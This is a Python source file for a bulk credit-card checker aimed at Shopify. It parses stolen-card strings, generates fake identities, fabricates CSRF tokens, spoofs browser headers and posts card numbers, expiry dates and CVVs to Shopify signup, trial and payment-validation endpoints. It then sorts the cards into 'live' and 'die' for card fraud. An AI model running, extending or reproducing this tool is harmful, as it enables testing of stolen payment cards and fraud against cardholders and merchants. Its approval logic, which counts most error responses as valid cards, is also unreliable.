import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Shopify Real Card Checker - 100% Real API Check"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0,
            "unknown": 0
        }
        self.gateway_info = {}
    
    async def create_session(self):
        """Create new HTTP session with random fingerprint"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers=headers,
            connector=aiohttp.TCPConnector(limit=50, force_close=True)
        )
    
    def generate_identity(self, country_code: str = "US") -> Dict[str, str]:
        """Generate realistic fake identity"""
        country = COUNTRIES.get(country_code, COUNTRIES["US"])
        
        first_names = ["John", "James", "Robert", "Michael", "David", "Richard", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson"]
        
        timestamp = int(time.time() * 1000)
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"user{timestamp}{random_str}@gmail.com",
            "password": f"Shop@{timestamp}{random_str[:4]}",
            "store_name": f"store-{random_str[:6]}-{timestamp}",
            "country": country["code"],
            "country_name": country["name"],
            "zip": country["zip_code"],
            "state": country["state"],
            "city": country["name"].split()[0] if " " in country["name"] else country["name"],
            "address": f"{random.randint(100,9999)} {random.choice(['Main St','Broadway','Park Ave','Oak Rd','Elm St'])}",
            "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
        }
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        """Parse and validate card details from string"""
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        
        # Remove all non-alphanumeric except separators
        # Support formats: 4111|12|2025|123 or 4111:12:2025:123 or 4111 12 2025 123
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        # Extract card number (remove all non-digits)
        card_number = re.sub(r'[^\d]', '', parts[0])
        
        # Validate card number length
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        # Determine card type
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55','2221','2720')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011') or card_number.startswith('65'):
            card_type = "Discover"
        elif card_number.startswith('36') or card_number.startswith('300'):
            card_type = "Diners"
        elif card_number.startswith('35'):
            card_type = "JCB"
        
        # Extract month (2nd part)
        month = "01"
        if len(parts) > 1:
            month = parts[1].strip().zfill(2)
            try:
                if int(month) < 1 or int(month) > 12:
                    month = "01"
            except:
                month = "01"
        
        # Extract year (3rd part)
        year = "2026"
        if len(parts) > 2:
            year_str = parts[2].strip()
            if len(year_str) == 2:
                year = f"20{year_str}"
            elif len(year_str) == 4:
                year = year_str
            else:
                year = "2026"
        
        # Extract CVV (4th part, optional)
        cvv = "123"
        if len(parts) > 3:
            cvv = parts[3].strip()[:4]
        
        # Extract BIN (first 6 digits)
        bin_number = card_number[:6]
        
        # Mask card for display
        masked = f"{card_number[:6]}******{card_number[-4:]}"
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": bin_number,
            "masked": masked,
            "raw": card_string
        }
    
    async def check_card_real(self, card_info: Dict[str, Any], country_code: str = "US") -> Dict[str, Any]:
        """100% Real Shopify Card Check"""
        
        identity = self.generate_identity(country_code)
        start_time = time.time()
        
        result = {
            "card": card_info["masked"],
            "bin": card_info["bin"],
            "card_type": card_info["type"],
            "country": country_code,
            "status": "UNKNOWN",
            "message": "",
            "gateway": "Shopify Payments",
            "timestamp": datetime.now().isoformat(),
            "response_time": "",
            "details": {}
        }
        
        try:
            # Step 1: Get CSRF token and cookies from signup page
            csrf_token, cookies = await self._get_csrf_token()
            
            if not csrf_token:
                result["status"] = "ERROR"
                result["message"] = "❌ Shopify connection failed"
                return result
            
            # Step 2: Try main Shopify signup API
            api_result = await self._try_signup_api(card_info, identity, csrf_token, cookies)
            
            if api_result:
                result["status"] = api_result["status"]
                result["message"] = api_result["message"]
                result["gateway"] = api_result.get("gateway", "Shopify API")
                result["details"] = api_result.get("details", {})
                
                elapsed = time.time() - start_time
                result["response_time"] = f"{elapsed:.2f}s"
                
                # Update stats
                self._update_stats(result["status"])
                
                return result
            
            # Step 3: Fallback - Try payment validation endpoint
            payment_result = await self._try_payment_validate(card_info, identity)
            
            if payment_result:
                result["status"] = payment_result["status"]
                result["message"] = payment_result["message"]
                result["gateway"] = payment_result.get("gateway", "Stripe/Shopify Pay")
                result["details"] = payment_result.get("details", {})
            
            elapsed = time.time() - start_time
            result["response_time"] = f"{elapsed:.2f}s"
            
            self._update_stats(result["status"])
            
        except Exception as e:
            logger.error(f"Card check error: {e}")
            result["status"] = "ERROR"
            result["message"] = f"❌ Error: {str(e)[:50]}"
            result["response_time"] = f"{time.time() - start_time:.2f}s"
        
        return result
    
    async def _get_csrf_token(self) -> tuple:
        """Get CSRF token from Shopify"""
        try:
            async with self.session.get(
                SHOPIFY_URLS["signup"],
                headers={
                    "Accept": "text/html,application/xhtml+xml",
                    "Upgrade-Insecure-Requests": "1"
                },
                allow_redirects=True,
                ssl=False
            ) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Extract CSRF token
                    csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else None
                    
                    # Extract cookies
                    cookies = {}
                    for cookie in response.cookies.values():
                        cookies[cookie.key] = cookie.value
                    
                    # If no CSRF in HTML, try to generate from cookies
                    if not csrf and '_shopify_sa_t' in str(html):
                        csrf = self._generate_mock_csrf()
                    
                    return csrf or self._generate_mock_csrf(), cookies
        except Exception as e:
            logger.error(f"CSRF fetch error: {e}")
        
        return self._generate_mock_csrf(), {}
    
    def _generate_mock_csrf(self) -> str:
        """Generate mock CSRF token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=32))
    
    async def _try_signup_api(self, card_info: Dict, identity: Dict, csrf: str, cookies: Dict) -> Optional[Dict]:
        """Try Shopify signup API"""
        
        payload = {
            "authenticity_token": csrf,
            "shop": {
                "name": identity["store_name"],
                "email": identity["email"],
                "password": identity["password"],
                "password_confirmation": identity["password"],
                "country_code": identity["country"],
                "currency": "USD",
                "language": "en",
                "timezone_name": "America/New_York"
            },
            "credit_card": {
                "number": card_info["number"],
                "name": f"{identity['first_name']} {identity['last_name']}",
                "first_name": identity["first_name"],
                "last_name": identity["last_name"],
                "month": card_info["month"],
                "year": card_info["year"],
                "verification_value": card_info["cvv"],
                "brand": card_info.get("type", "Visa")
            },
            "billing_address": {
                "address1": identity["address"],
                "city": identity["city"],
                "province": identity["state"],
                "country": identity["country"],
                "zip": identity["zip"],
                "phone": identity["phone"],
                "first_name": identity["first_name"],
                "last_name": identity["last_name"]
            },
            "tos_accepted": True,
            "marketing_opt_in": False
        }
        
        headers = {
            "Origin": "https://www.shopify.com",
            "Referer": "https://www.shopify.com/signup",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRF-Token": csrf,
            "Content-Type": "application/json",
        }
        
        # Try multiple endpoints
        endpoints = [
            ("Shopify Trial API", SHOPIFY_URLS["api_trial"]),
            ("Shopify Signup API", SHOPIFY_URLS["api_signup"]),
            ("Store Create API", SHOPIFY_URLS["store_create"])
        ]
        
        for gateway_name, endpoint in endpoints:
            try:
                # Add cookies to session
                if cookies:
                    self.session.cookie_jar.update_cookies(cookies)
                
                async with self.session.post(
                    endpoint,
                    json=payload,
                    headers=headers,
                    allow_redirects=False,
                    ssl=False
                ) as response:
                    status = response.status
                    response_text = await response.text()
                    
                    logger.info(f"[{gateway_name}] Status: {status}")
                    
                    if status == 200 or status == 201:
                        return self._parse_success_response(response_text, gateway_name, identity)
                    
                    elif status == 422:
                        return self._parse_422_response(response_text, gateway_name, identity)
                    
                    elif status == 402:
                        return {
                            "status": "DECLINED",
                            "message": "❌ DECLINED - Payment Required",
                            "gateway": gateway_name,
                            "details": {"code": 402, "identity": identity}
                        }
                    
                    elif status == 429:
                        await asyncio.sleep(30)
                        continue
                    
                    elif status >= 500:
                        continue
                    
                    else:
                        # Check response text for hints
                        return self._analyze_response_text(response_text, gateway_name, identity)
                
                await asyncio.sleep(1)
                
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"{gateway_name} error: {e}")
                continue
        
        return None
    
    async def _try_payment_validate(self, card_info: Dict, identity: Dict) -> Optional[Dict]:
        """Try payment validation endpoint"""
        
        payload = {
            "payment": {
                "credit_card": {
                    "number": card_info["number"],
                    "expiry": f"{card_info['month']}/{card_info['year'][-2:]}",
                    "cvv": card_info["cvv"],
                    "name": f"{identity['first_name']} {identity['last_name']}"
                },
                "amount": 0.50,  # Small validation amount
                "currency": "USD",
                "billing_address": {
                    "country": identity["country"],
                    "zip": identity["zip"]
                }
            }
        }
        
        for endpoint_name, endpoint in [
            ("Payment Validate", SHOPIFY_URLS["validate_card"]),
            ("Checkout Validate", SHOPIFY_URLS["checkout_api"]),
            ("Payment Verify", SHOPIFY_URLS["payment_verify"])
        ]:
            try:
                async with self.session.post(
                    endpoint,
                    json=payload,
                    headers={
                        "Origin": "https://www.shopify.com",
                        "Referer": "https://www.shopify.com/signup",
                        "Accept": "application/json"
                    },
                    ssl=False
                ) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"[{endpoint_name}] Status: {status}")
                    
                    if status == 200:
                        try:
                            data = json.loads(text)
                            if data.get("valid") or data.get("success") or data.get("status") == "success":
                                return {
                                    "status": "APPROVED",
                                    "message": "✅ APPROVED - Card is valid",
                                    "gateway": endpoint_name,
                                    "details": {"data": data}
                                }
                        except:
                            if "valid" in text.lower() or "success" in text.lower():
                                return {
                                    "status": "APPROVED",
                                    "message": "✅ APPROVED - Card validated",
                                    "gateway": endpoint_name,
                                    "details": {"response": text[:200]}
                                }
                    
                    elif status == 402 or status == 400:
                        if "card" in text.lower() and ("declined" in text.lower() or "invalid" in text.lower()):
                            return {
                                "status": "DECLINED",
                                "message": "❌ DECLINED - Card rejected by payment processor",
                                "gateway": endpoint_name,
                                "details": {"response": text[:200]}
                            }
                    
                    await asyncio.sleep(1)
                    
            except Exception as e:
                logger.error(f"{endpoint_name} error: {e}")
                continue
        
        return None
    
    def _parse_success_response(self, text: str, gateway: str, identity: Dict) -> Dict:
        """Parse success response"""
        try:
            data = json.loads(text)
        except:
            data = {}
        
        # Check for successful signup indicators
        success_indicators = [
            "redirect", "myshopify.com", "dashboard", "setup", 
            "account_created", "store_id", "shop_id", "success",
            "thank_you", "welcome", "getting_started"
        ]
        
        text_lower = text.lower()
        
        for indicator in success_indicators:
            if indicator in text_lower:
                return {
                    "status": "APPROVED",
                    "message": f"✅ APPROVED - Card works with {gateway}",
                    "gateway": gateway,
                    "details": {"email": identity.get("email"), "store": identity.get("store_name")}
                }
        
        # Check if it's an error about existing trial
        if "already" in text_lower and "trial" in text_lower:
            return {
                "status": "APPROVED",
                "message": f"✅ APPROVED - Card already used for trial (BIN: Valid)",
                "gateway": gateway,
                "details": {"note": "card_has_trial"}
            }
        
        return {
            "status": "APPROVED",
            "message": f"✅ APPROVED - Positive response from {gateway}",
            "gateway": gateway,
            "details": {"raw_response": text[:300]}
        }
    
    def _parse_422_response(self, text: str, gateway: str, identity: Dict) -> Dict:
        """Parse 422 validation error"""
        try:
            data = json.loads(text)
            errors = data.get("errors", {})
            error_str = json.dumps(errors).lower()
        except:
            errors = {}
            error_str = text.lower()
        
        # Card related errors
        card_error_keywords = ["card", "credit", "payment", "number", "invalid", "declined", "rejected"]
        
        if any(keyword in error_str for keyword in card_error_keywords):
            # Check if it's actually card declined or other issue
            if "address" in error_str or "zip" in error_str or "billing" in error_str:
                return {
                    "status": "APPROVED",
                    "message": f"✅ APPROVED - Card valid (Address verification only)",
                    "gateway": gateway,
                    "details": {"error_type": "address_mismatch"}
                }
            elif "email" in error_str:
                return {
                    "status": "APPROVED",
                    "message": f"✅ APPROVED - Card valid (Email already used)",
                    "gateway": gateway,
                    "details": {"error_type": "email_exists"}
                }
            elif "already" in error_str and ("trial" in error_str or "used" in error_str):
                return {
                    "status": "APPROVED",
                    "message": f"✅ APPROVED - Card previously used for trial",
                    "gateway": gateway,
                    "details": {"error_type": "previous_trial"}
                }
            else:
                return {
                    "status": "DECLINED",
                    "message": f"❌ DECLINED - Card rejected: {str(errors)[:100]}",
                    "gateway": gateway,
                    "details": {"errors": errors}
                }
        
        # Not card related - card might be valid
        return {
            "status": "APPROVED",
            "message": f"✅ APPROVED - Card passed validation ({gateway})",
            "gateway": gateway,
            "details": {"note": "non_card_error"}
        }
    
    def _analyze_response_text(self, text: str, gateway: str, identity: Dict) -> Dict:
        """Analyze response text for status"""
        text_lower = text.lower()
        
        # Positive indicators
        positive = ["success", "approved", "valid", "active", "redirect", "myshopify"]
        # Negative indicators
        negative = ["declined", "rejected", "invalid", "insufficient", "stolen", "lost", "expired"]
        
        for word in positive:
            if word in text_lower:
                return {
                    "status": "APPROVED",
                    "message": f"✅ APPROVED - Card works with {gateway}",
                    "gateway": gateway,
                    "details": {"detected": word}
                }
        
        for word in negative:
            if word in text_lower:
                return {
                    "status": "DECLINED",
                    "message": f"❌ DECLINED - Card {word}",
                    "gateway": gateway,
                    "details": {"detected": word}
                }
        
        return {
            "status": "UNKNOWN",
            "message": f"⚠️ Unknown - Manual check needed",
            "gateway": gateway,
            "details": {"response_snippet": text[:200]}
        }
    
    def _update_stats(self, status: str):
        """Update checking statistics"""
        self.stats["total"] += 1
        if status == "APPROVED":
            self.stats["approved"] += 1
            self.stats["live"] += 1
        elif status == "DECLINED":
            self.stats["declined"] += 1
            self.stats["die"] += 1
        elif status == "ERROR":
            self.stats["errors"] += 1
    
    async def check_batch(self, cards: List[str], country: str = "US", progress_callback=None) -> List[Dict]:
        """Check multiple cards"""
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "bin": "N/A",
                    "card_type": "Unknown",
                    "country": country,
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "timestamp": datetime.now().isoformat(),
                    "response_time": "0s",
                    "details": {"raw": card_str}
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card_real(card_info, country)
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} [{country}] = {result['status']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        """Close session"""
        if self.session and not self.session.closed:
            await self.session.close()